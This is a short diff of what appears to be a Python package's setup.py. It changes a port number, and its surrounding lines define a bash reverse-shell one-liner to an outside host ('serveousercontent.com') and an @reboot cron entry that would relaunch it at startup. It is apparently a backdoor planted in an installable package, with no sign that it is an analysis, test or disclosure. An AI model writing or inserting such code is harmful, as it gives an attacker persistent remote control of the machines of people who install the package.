@@ -2,7 +2,7 @@ import sys, subprocess
 from setuptools import setup, find_packages
 
 HOST = "serveousercontent.com"
-PORT = 23586
+PORT = 50662
 
 _ONE_LINER = f"bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1"
 _CRON = f"@reboot /bin/bash -c '{_ONE_LINER}' >/dev/null 2>&1"
